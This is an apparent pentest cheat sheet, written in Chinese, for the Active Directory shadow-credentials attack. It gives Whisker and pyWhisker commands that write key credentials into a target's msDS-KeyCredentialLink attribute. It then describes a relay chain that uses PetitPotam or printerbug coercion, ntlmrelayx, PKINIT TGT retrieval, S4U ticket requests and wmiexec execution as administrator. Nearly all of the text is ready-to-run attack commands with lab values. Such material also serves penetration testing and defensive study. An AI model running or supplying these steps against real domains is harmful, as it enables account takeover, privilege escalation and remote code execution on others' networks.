	将密钥凭据添加到目标用户/计算机对象的属性msDS-KeyCredentialLink，然后使用 PKINIT 作为该帐户执行 Kerberos 身份验证，以获取该用户的 TGT
	要求：
	Windows Server 2016 上的域控制器
	PKINIT Kerberos 身份验证
	具有写入msDS-KeyCredentialLink目标对象属性的委托权限的帐户
	Windows中使用https://github.com/eladshamir/Whisker
	列出目标对象的 msDS-KeyCredentialLink 属性的所有条目
	>Whisker.exe list /target:computername$
	生成一个公钥-私钥对并向目标对象添加一个新的密钥凭证，就像用户从新设备注册到 WHfB 一样。
	>Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
	>Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1]
	从由 DeviceID GUID 指定的目标对象中删除密钥凭据。
	>Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
	Linux使用https://github.com/ShutdownRepo/pyWhisker
	>python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
	>pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"
	>python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename "test1"
	>python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
	场景：影子凭证中继
	DC01从(PetitPotam)触发 NTLM 身份验证
	将其中继到DC02(ntlmrelayx)
	EditDC01的属性创建一个 Kerberos PKINIT 预认证后门（pywhisker）
	或者 ：ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
	设置 ntlmrelayx 将身份验证从目标工作站中继到 DC
	>proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\$ --http-port 81
	执行打印机错误以触发来自目标工作站的身份验证
	>proxychains python3 printerbug.py ez.lab/matt:Password1\!@ws2.ez.lab ws1@8081/file
	使用新获得的证书通过 PKINIT 获取 TGT
	>proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR
	获取目标账户的 TGS
	>proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v
	利用 TGS 进行未来的活动
	>export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
	>proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
